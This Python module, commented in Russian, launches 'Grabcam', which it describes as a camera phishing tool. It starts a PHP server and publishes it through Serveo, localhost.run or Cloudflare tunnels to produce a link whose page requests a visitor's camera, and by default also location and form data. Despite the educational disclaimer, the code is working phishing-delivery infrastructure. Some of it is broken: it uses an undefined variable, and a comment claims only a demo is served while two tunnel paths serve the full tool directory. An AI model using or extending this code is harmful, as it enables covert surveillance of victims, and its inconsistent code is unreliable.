"""
Инструмент Grabcam: тестирование доступа к веб-камере (Camera Phishing Tool).
Запуск PHP-сервера и туннеля Serveo или только локального PHP-сервера.
Только для образовательных целей и тестирования с разрешения.
"""
import os
import re
import shutil
import signal
import subprocess
import threading
import time
import queue
from typing import Any

from .base import ToolBase

_PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
_GRABCAM_DIR = os.path.join(_PROJECT_ROOT, "tools", "grabcam")
_DEMO_DIR = os.path.join(_GRABCAM_DIR, "demo")
_OPTIONS_FILE = os.path.join(_GRABCAM_DIR, "options.json")

_DEFAULT_FEATURES = {"camera": True, "geo": True, "form": True, "gallery": False, "mic": False, "screen": False}
_SCRIPT = os.path.join(_GRABCAM_DIR, "grabcam.sh")
_SENDLINK = os.path.join(_GRABCAM_DIR, "sendlink")
_PHP_PORT = 3333
_PHP_PORTS_RANGE = (3333, 3334, 3335, 3336, 3337)  # первый свободный выбирается на запуск

# Паттерны ссылок туннелей
_SERVEO_LINK_RE = re.compile(
    r"https://[0-9a-zA-Z\-]+\.(?:serveo\.net|serveousercontent\.com)",
    re.IGNORECASE,
)
_LOCALHOST_RUN_LINK_RE = re.compile(
    r"https://[0-9a-zA-Z\-]+\.lhr\.life",
    re.IGNORECASE,
)
_CLOUDFLARE_LINK_RE = re.compile(
    r"https://[0-9a-zA-Z\-]+\.trycloudflare\.com",
    re.IGNORECASE,
)

_state = {
    "proc": None,
    "proc_ssh": None,
    "proc_cloudflared": None,
    "link": None,
    "local_url": None,
    "running": False,
    "error": None,
    "method": None,
    "started_at": None,
    "php_port": None,
}
_lock = threading.Lock()


def _php_available() -> bool:
    """Проверка наличия PHP в системе."""
    return shutil.which("php") is not None


def _ssh_available() -> bool:
    """Проверка наличия SSH в системе (Serveo, localhost.run)."""
    return shutil.which("ssh") is not None


def _cloudflared_available() -> bool:
    """Проверка наличия cloudflared (Cloudflare Tunnel)."""
    return shutil.which("cloudflared") is not None


def _port_in_use(port: int) -> bool:
    """Проверка, занят ли порт (упрощённо)."""
    try:
        import socket
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(0.5)
            return s.connect_ex(("127.0.0.1", port)) == 0
    except Exception:
        return False


def _find_free_port() -> int | None:
    """Первый свободный порт из диапазона, чтобы не конфликтовать с другими сессиями."""
    for p in _PHP_PORTS_RANGE:
        if not _port_in_use(p):
            return p
    return None


def _extract_serveo_link(text: str) -> str | None:
    """Извлекает ссылку Serveo из текста (serveo.net или serveousercontent.com)."""
    m = _SERVEO_LINK_RE.search(text)
    return m.group(0) if m else None


def _wait_for_tunnel_link(proc: subprocess.Popen, pattern: re.Pattern, timeout: int) -> str | None:
    """Read tunnel output asynchronously so a quiet stdout cannot defeat the timeout."""
    if proc.stdout is None:
        return None
    lines = queue.Queue()
    def pump_output():
        try:
            for line in iter(proc.stdout.readline, ""):
                lines.put(line)
        finally:
            lines.put("")
    threading.Thread(target=pump_output, daemon=True).start()
    deadline = time.monotonic() + timeout
    collected = []
    while time.monotonic() < deadline:
        if proc.poll() is not None and lines.empty():
            break
        try:
            line = lines.get(timeout=min(0.25, max(0.01, deadline - time.monotonic())))
        except queue.Empty:
            continue
        if not line:
            break
        collected.append(line)
        match = pattern.search(line)
        if match:
            return match.group(0)
    match = pattern.search("".join(collected))
    return match.group(0) if match else None

def _php_command(port: int, host: str = '127.0.0.1') -> list[str]:
    """Serve only the isolated training demo, never legacy GrabCam PHP endpoints."""
    return ["php", "-S", f"{host}:{port}", "-t", _DEMO_DIR]
def _read_link_from_file() -> str | None:
    """Читает ссылку Serveo из файла sendlink (для совместимости со скриптом)."""
    if not os.path.isfile(_SENDLINK):
        return None
    try:
        with open(_SENDLINK, "r", encoding="utf-8", errors="replace") as f:
            text = f.read()
        return _extract_serveo_link(text)
    except OSError:
        return None


def _worker_serveo(port: int):
    """Запуск Serveo: PHP + SSH туннель, парсинг ссылки из вывода SSH."""
    with _lock:
        _state["running"] = True
        _state["link"] = None
        _state["error"] = None
        _state["proc"] = None
        _state["proc_ssh"] = None
        _state["local_url"] = None
        _state["started_at"] = time.time()
        _state["php_port"] = port

    proc_php = None
    proc_ssh = None
    link = None

    try:
        # 1) Запуск PHP-сервера в grabcam
        proc_php = subprocess.Popen(
            _php_command(port),
            cwd=_DEMO_DIR,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True,
        )
        with _lock:
            _state["proc"] = proc_php
        time.sleep(0.8)
        if proc_php.poll() is not None:
            with _lock:
                _state["running"] = False
                _state["proc"] = None
                _state["error"] = "PHP-сервер не запустился. Проверьте порт 3333 и наличие PHP."
            return

        # 2) Генерация index2.html с плейсхолдером (ссылка подставится после получения)

        # 3) Запуск SSH туннеля Serveo (сначала порт 22, при недоступности — 443)
        ssh_opts = [
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            "-o", "ServerAliveInterval=60",
            "-o", "ConnectTimeout=15",
            "-R", f"80:127.0.0.1:{port}",
            "serveo.net",
        ]
        for ssh_port in (22, 443):
            cmd = (["ssh", "-p", "443"] if ssh_port == 443 else ["ssh"]) + ssh_opts
            try:
                proc_ssh = subprocess.Popen(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True,
                    bufsize=1,
                    start_new_session=True,
                )
            except FileNotFoundError:
                with _lock:
                    _state["running"] = False
                    _state["proc"] = None
                    _state["error"] = "SSH не найден. Установите openssh-client (apt install openssh-client)."
                return
            except Exception as e:
                with _lock:
                    _state["error"] = str(e)
                continue

            with _lock:
                _state["proc_ssh"] = proc_ssh

            link = _wait_for_tunnel_link(proc_ssh, _SERVEO_LINK_RE, 25)
            if link:
                with _lock:
                    _state["link"] = link

                return
            # SSH завершился без ссылки или таймаут — пробуем порт 443
            try:
                if proc_ssh.poll() is None:
                    proc_ssh.terminate()
                    time.sleep(1)
                    if proc_ssh.poll() is None:
                        proc_ssh.kill()
            except Exception:
                pass
            proc_ssh = None
            with _lock:
                _state["proc_ssh"] = None

        with _lock:
            _state["error"] = (
                "Serveo недоступен (часто в РФ или за фаерволом). Выберите в списке метод «localhost.run» или «Cloudflare Tunnel» — они обычно работают."
            )
            _state["running"] = False
            _state["proc"] = None
            _state["proc_ssh"] = None
        if proc_ssh and proc_ssh.poll() is None:
            try:
                proc_ssh.terminate()
            except Exception:
                pass
        if proc_php and proc_php.poll() is None:
            try:
                proc_php.terminate()
            except Exception:
                pass
    except Exception as e:
        with _lock:
            _state["error"] = str(e)
            _state["running"] = False
            _state["proc"] = None
            _state["proc_ssh"] = None
        for p in (proc_ssh, proc_php):
            if p and p.poll() is None:
                try:
                    p.terminate()
                except Exception:
                    pass


def _worker_localhost_run():
    """Туннель localhost.run (SSH). Часто работает там, где Serveo недоступен (в т.ч. РФ)."""
    with _lock:
        _state["running"] = True
        _state["link"] = None
        _state["error"] = None
        _state["proc"] = None
        _state["proc_ssh"] = None
        _state["local_url"] = None
        _state["started_at"] = time.time()

    proc_php = None
    proc_ssh = None
    link = None
    try:
        port = _state.get("php_port") or _PHP_PORT
        proc_php = subprocess.Popen(
            ["php", "-S", f"127.0.0.1:{port}"],
            cwd=_GRABCAM_DIR,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True,
        )
        with _lock:
            _state["proc"] = proc_php
        time.sleep(0.8)
        if proc_php.poll() is not None:
            with _lock:
                _state["running"] = False
                _state["proc"] = None
                _state["error"] = "PHP-сервер не запустился."
            return

        cmd = [
            "ssh", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
            "-o", "ServerAliveInterval=60", "-o", "ConnectTimeout=20",
            "-R", f"80:127.0.0.1:{port}", "nokey@localhost.run",
        ]
        try:
            proc_ssh = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                start_new_session=True,
            )
        except FileNotFoundError:
            with _lock:
                _state["running"] = False
                _state["proc"] = None
                _state["error"] = "SSH не найден. Установите openssh-client."
            return
        with _lock:
            _state["proc_ssh"] = proc_ssh
        link = _wait_for_tunnel_link(proc_ssh, _LOCALHOST_RUN_LINK_RE, 30)
        if link:
            with _lock:
                _state["link"] = link

            return
        with _lock:
            _state["error"] = "Не удалось получить ссылку localhost.run. Проверьте интернет и доступность localhost.run."
            _state["running"] = False
            _state["proc"] = None
            _state["proc_ssh"] = None
        for p in (proc_ssh, proc_php):
            if p and p.poll() is None:
                try:
                    p.terminate()
                except Exception:
                    pass
    except Exception as e:
        with _lock:
            _state["error"] = str(e)
            _state["running"] = False
            _state["proc"] = None
            _state["proc_ssh"] = None
        for p in (proc_ssh, proc_php):
            if p and p.poll() is None:
                try:
                    p.terminate()
                except Exception:
                    pass


def _worker_cloudflared():
    """Cloudflare Quick Tunnel — часто доступен в РФ, не требует SSH."""
    with _lock:
        _state["running"] = True
        _state["link"] = None
        _state["error"] = None
        _state["proc"] = None
        _state["proc_ssh"] = None
        _state["proc_cloudflared"] = None
        _state["local_url"] = None
        _state["started_at"] = time.time()

    proc_php = None
    proc_cf = None
    link = None
    try:
        port = _state.get("php_port") or _PHP_PORT
        proc_php = subprocess.Popen(
            ["php", "-S", f"127.0.0.1:{port}"],
            cwd=_GRABCAM_DIR,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True,
        )
        with _lock:
            _state["proc"] = proc_php
        time.sleep(0.8)
        if proc_php.poll() is not None:
            with _lock:
                _state["running"] = False
                _state["proc"] = None
                _state["error"] = "PHP-сервер не запустился."
            return

        try:
            proc_cf = subprocess.Popen(
                ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{port}"],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                start_new_session=True,
            )
        except FileNotFoundError:
            with _lock:
                _state["running"] = False
                _state["proc"] = None
                _state["error"] = "cloudflared не найден. Установите: https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/"
            return
        with _lock:
            _state["proc_cloudflared"] = proc_cf
        link = _wait_for_tunnel_link(proc_cf, _CLOUDFLARE_LINK_RE, 25)
        if link:
            with _lock:
                _state["link"] = link

            return
        with _lock:
            _state["error"] = "Не удалось получить ссылку Cloudflare. Проверьте интернет."
            _state["running"] = False
            _state["proc"] = None
            _state["proc_cloudflared"] = None
        for p in (proc_cf, proc_php):
            if p and p.poll() is None:
                try:
                    p.terminate()
                except Exception:
                    pass
    except Exception as e:
        with _lock:
            _state["error"] = str(e)
            _state["running"] = False
            _state["proc"] = None
            _state["proc_cloudflared"] = None
        for p in (proc_cf, proc_php):
            if p and p.poll() is None:
                try:
                    p.terminate()
                except Exception:
                    pass


def _worker_php_only(port: int = _PHP_PORT):
    """Только PHP-сервер в папке grabcam."""
    with _lock:
        _state["running"] = True
        _state["local_url"] = f"http://127.0.0.1:{port}"
        _state["error"] = None
        _state["proc"] = None
        _state["link"] = None
        _state["started_at"] = time.time()
        _state["php_port"] = port
    proc = None
    try:
        proc = subprocess.Popen(
            _php_command(port, "0.0.0.0"),
            cwd=_DEMO_DIR,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True,
        )
        with _lock:
            _state["proc"] = proc
        proc.wait()
    except Exception as e:
        with _lock:
            _state["error"] = str(e)
    finally:
        with _lock:
            _state["running"] = False
            _state["proc"] = None


class ToolGrabcam(ToolBase):
    @property
    def tool_id(self) -> str:
        return "grabcam"

    @property
    def name(self) -> str:
        return "Grabcam"

    @property
    def description(self) -> str:
        return "Тестирование доступа к веб-камере по ссылке. Только для образования и тестирования с явного разрешения."

    def run(self, params: dict[str, Any]) -> dict[str, Any]:
        import json
        method = (params.get("method") or "php_only").strip().lower()
        if method not in ("serveo", "php_only", "localhost_run", "cloudflared"):
            method = "php_only"
        try:
            with open(_OPTIONS_FILE, "w", encoding="utf-8") as f:
                json.dump(options, f, ensure_ascii=False, indent=2)
        except OSError:
            pass
        # Выбираем порт под сессию (первый свободный).
        port = _find_free_port() or _PHP_PORT
        with _lock:
            _state["php_port"] = port

        with _lock:
            _state["error"] = None
            _state["method"] = method
            if _state.get("running"):
                return {"success": False, "error": "Сервер уже запущен. Сначала нажмите «Остановить»."}

        if not _php_available():
            return {"success": False, "error": "PHP не найден. Установите PHP (apt install php, dnf install php и т.д.)."}

        if method == "php_only":
            if not os.path.isdir(_GRABCAM_DIR):
                return {"success": False, "error": "Папка не найдена: tools/grabcam"}
            if _port_in_use(port):
                return {"success": False, "error": f"Порт {port} занят. Остановите другой сервер или выберите туннель."}
            thread = threading.Thread(target=_worker_php_only, args=(port,), daemon=True)
            thread.start()
            time.sleep(0.5)
            with _lock:
                return {
                    "success": True,
                    "started": True,
                    "local_url": _state.get("local_url") or f"http://127.0.0.1:{port}",
                    "message": "PHP-сервер запущен. Откройте ссылку в браузере — страница запросит доступ к камере.",
                }
        elif method == "cloudflared":
            if not _cloudflared_available():
                return {"success": False, "error": "cloudflared не найден. Скачайте: https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/ (часто работает в РФ)."}
            if _port_in_use(port):
                return {"success": False, "error": f"Порт {port} занят."}
            thread = threading.Thread(target=_worker_cloudflared, daemon=True)
            thread.start()
            return {"success": True, "started": True, "message": "Запуск PHP и Cloudflare Tunnel… Ссылка появится через 5–15 сек."}
        else:
            # serveo или localhost_run — нужен SSH
            if not _ssh_available():
                return {"success": False, "error": "SSH не найден. Установите openssh-client (apt install openssh-client)."}
            if _port_in_use(port):
                return {"success": False, "error": f"Порт {port} занят."}
            if method == "localhost_run":
                with _lock:
                    _state["php_port"] = port
                thread = threading.Thread(target=_worker_localhost_run, daemon=True)
                thread.start()
                return {"success": True, "started": True, "message": "Запуск PHP и localhost.run… Ссылка появится через 10–30 сек. (рекомендуется для РФ.)"}
            else:
                thread = threading.Thread(target=_worker_serveo, args=(port,), daemon=True)
                thread.start()
                return {"success": True, "started": True, "message": "Запуск PHP и Serveo… Ссылка появится через 10–25 сек."}

    def stop_run(self) -> tuple[bool, str]:
        with _lock:
            proc = _state.get("proc")
            proc_ssh = _state.get("proc_ssh")
            proc_cf = _state.get("proc_cloudflared")
            if not proc and not proc_ssh and not proc_cf:
                return False, "Ничего не запущено."
            _state["proc"] = None
            _state["proc_ssh"] = None
            _state["proc_cloudflared"] = None
        def kill_process(p):
            if p is None:
                return
            try:
                if hasattr(os, "killpg") and p.pid:
                    try:
                        pgid = os.getpgid(p.pid)
                        os.killpg(pgid, signal.SIGKILL)
                    except (ProcessLookupError, OSError):
                        try:
                            p.kill()
                        except Exception:
                            pass
                else:
                    p.kill()
            except ProcessLookupError:
                pass
            except Exception:
                try:
                    p.terminate()
                except Exception:
                    pass
        kill_process(proc_ssh)
        kill_process(proc_cf)
        kill_process(proc)
        with _lock:
            _state["running"] = False
            _state["link"] = None
            _state["local_url"] = None
            _state["error"] = None
            _state["method"] = None
            _state["started_at"] = None
            _state["php_port"] = None
        return True, "Остановлено."

    def get_run_status(self) -> dict:
        with _lock:
            link = _state.get("link")
            local_url = _state.get("local_url")
            running = _state.get("running", False)
            err = _state.get("error")
            method = _state.get("method")
            started_at = _state.get("started_at")
        if not running and not link and not local_url:
            return {"running": False, "link": None, "local_url": None, "error": err, "method": None, "started_at": None}
        return {
            "running": running,
            "link": link,
            "local_url": local_url,
            "error": err,
            "method": method,
            "started_at": started_at,
        }
